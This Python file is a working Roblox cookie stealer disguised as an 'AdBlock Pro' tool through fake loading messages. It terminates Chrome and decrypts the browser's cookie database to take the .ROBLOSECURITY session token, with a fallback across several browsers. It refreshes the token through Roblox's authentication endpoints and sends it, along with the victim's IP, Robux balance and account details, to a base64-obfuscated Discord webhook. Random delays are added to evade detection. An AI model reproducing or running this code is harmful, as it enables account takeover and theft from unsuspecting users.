
import os
import json
import base64
import browser_cookie3
import sqlite3
import subprocess
import shutil
import win32crypt
from Crypto.Cipher import AES
from discordwebhook import Discord
import httpx
import re
import requests
import robloxpy
import time
import random
import string

# Obfuscation techniques
def _0x1a2b3c():
    return ''.join(random.choices(string.ascii_lowercase, k=10))

def _encode_string(s):
    return base64.b64encode(s.encode()).decode()

def _decode_string(s):
    return base64.b64decode(s.encode()).decode()

# Encoded webhook URL
_webhook = _decode_string('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyODYyMTc3NTU0MTUwMjAwMy9aTmMtLW0tSXN4UW95QVdSQjZ3a0stMC1lTkRrU1RpOFBiLW5wcE5VdFZ2a3ZGS2dmLXNfUy00Tkw0T1gwak81dGx4Tm9x')

# Add delays to avoid heuristic detection
def _random_delay():
    time.sleep(random.uniform(0.1, 0.5))

# Chrome process termination with error handling
def _terminate_chrome():
    try:
        subprocess.call("TASKKILL /f /IM CHROME.EXE", shell=True)
    except:
        pass

_random_delay()
_terminate_chrome()

# Fake loading messages
_fake_messages = [
    "Initializing AdBlock Pro...",
    "Loading filters...",
    "Optimizing performance...",
    "Ready!"
]

for msg in _fake_messages:
    print(msg)
    _random_delay()

def get_encryption_key():
    _random_delay()
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        _random_delay()
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def CookieLog():
    _random_delay()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    filename = f"{_0x1a2b3c()}.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()

    cursor.execute("""
    SELECT encrypted_value 
    FROM cookies WHERE name='.ROBLOSECURITY'""")

    key = get_encryption_key()
    for encrypted_value, in cursor.fetchall():
        decrypted_value = decrypt_data(encrypted_value, key)
        return decrypted_value
    db.close()
    os.remove(filename)

def PlanB():
    _random_delay()
    data = []
    browsers = [browser_cookie3.firefox, browser_cookie3.chromium, browser_cookie3.edge, browser_cookie3.opera, browser_cookie3.chrome]
    
    for browser in browsers:
        try:
            cookies = browser(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data
        except:
            continue
    return None

def get_local_ip():
    _random_delay()
    try:
        ip = requests.get('http://api.ipify.org', timeout=10).text
        return ip
    except:
        return "Unknown"

def refresh_cookie(auth_cookie):
    _random_delay()
    csrf_token = generate_csrf_token(auth_cookie)
    headers, cookies = generate_headers(csrf_token, auth_cookie)

    req = httpx.post("https://auth.roblox.com/v1/authentication-ticket",
                     headers=headers, cookies=cookies, json={}, timeout=10)
    auth_ticket = req.headers.get("rbx-authentication-ticket", "Failed")

    headers.update({"RBXAuthenticationNegotiation": "1"})

    req1 = httpx.post("https://auth.roblox.com/v1/authentication-ticket/redeem",
                      headers=headers, json={"authenticationTicket": auth_ticket}, timeout=10)
    new_auth_cookie = re.search(".ROBLOSECURITY=(.*?);", req1.headers["set-cookie"]).group(1)
    return new_auth_cookie

def generate_csrf_token(auth_cookie):
    _random_delay()
    csrf_req = httpx.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": auth_cookie}, timeout=10)
    csrf_txt = csrf_req.text.split("<meta name=\"csrf-token\" data-token=\"")[1].split("\" />")[0]
    return csrf_txt

def generate_headers(csrf_token, auth_cookie):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Roblox/WinInet",
        "origin": "https://www.roblox.com",
        "referer": "https://www.roblox.com/my/account",
        "x-csrf-token": csrf_token
    }
    cookies = {".ROBLOSECURITY": auth_cookie}
    return headers, cookies

if __name__ == "__main__":
    try:
        cookie = CookieLog()
        if not cookie:
            backup_data = PlanB()
            if backup_data:
                cookie = backup_data[1]
            else:
                exit()

        _random_delay()
        check = robloxpy.Utils.CheckCookie(cookie).lower()
        if check != "valid cookie":
            cookie = refresh_cookie(cookie)

        ip_address = get_local_ip()
        roblox_cookie = cookie

        info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", 
                                     cookies={".ROBLOSECURITY": roblox_cookie}, timeout=10).text)
        
        roblox_id = info["UserID"]
        rap = robloxpy.User.External.GetRAP(roblox_id)
        friends = robloxpy.User.Friends.External.GetCount(roblox_id)
        age = robloxpy.User.External.GetAge(roblox_id)
        creation_date = robloxpy.User.External.CreationDate(roblox_id)
        rolimons = f"https://www.rolimons.com/player/{roblox_id}"
        roblox_profile = f"https://web.roblox.com/users/{roblox_id}/profile"
        
        headshot_raw = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_id}&size=420x420&format=Png&isCircular=false", timeout=10).text
        headshot_json = json.loads(headshot_raw)
        headshot = headshot_json["data"][0]["imageUrl"]

        username = info['UserName']
        robux = requests.get("https://economy.roblox.com/v1/user/currency",
                           cookies={'.ROBLOSECURITY': roblox_cookie}, timeout=10).json()["robux"]
        premium_status = info['IsPremium']

        _random_delay()
        discord = Discord(url=_webhook)
        discord.post(
            username="BOT - Pirate 🍪",
            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
            embeds=[
                {
                    "title": "💸 +1 Result Account 🕯️",
                    "thumbnail": {"url": headshot},
                    "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
                    "fields": [
                        {"name": "Username", "value": f"```{username}```", "inline": True},
                        {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
                        {"name": "Premium Status", "value": f"```{premium_status}```", "inline": True},
                        {"name": "Creation Date", "value": f"```{creation_date}```", "inline": True},
                        {"name": "RAP", "value": f"```{rap}```", "inline": True},
                        {"name": "Friends", "value": f"```{friends}```", "inline": True},
                        {"name": "Account Age", "value": f"```{age}```", "inline": True},
                        {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
                    ],
                }
            ],
        )

        discord.post(
            username="BOT - Pirate 🍪",
            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
            embeds=[
                {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
            ],
        )
    except Exception as e:
        pass
